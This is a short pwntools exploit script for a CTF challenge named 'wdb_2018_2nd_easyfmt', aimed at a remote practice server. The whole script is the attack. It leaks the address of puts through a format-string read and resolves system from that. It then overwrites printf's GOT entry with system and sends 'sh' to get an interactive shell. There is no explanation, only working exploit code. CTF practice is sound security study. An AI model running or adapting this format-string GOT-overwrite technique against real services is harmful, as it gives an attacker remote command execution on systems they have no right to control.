from pwn import *
from my_pwn import *
#p = process("./wdb_2018_2nd_easyfmt")
p = remote("node3.buuoj.cn","29470")
printf_got = 0x0804A014
puts = 0x0804A018

payload = "%7$s" + p32(puts)

p.sendafter("\n",payload)

addr = u32(p.recv(4))
print hex(addr)

system,binsh = retsystem("puts",addr)

payload = fmtstr_payload(6,{printf_got:system})
#6
p.sendafter("\n",payload)
p.sendafter("\n","sh\x00")
p.interactive()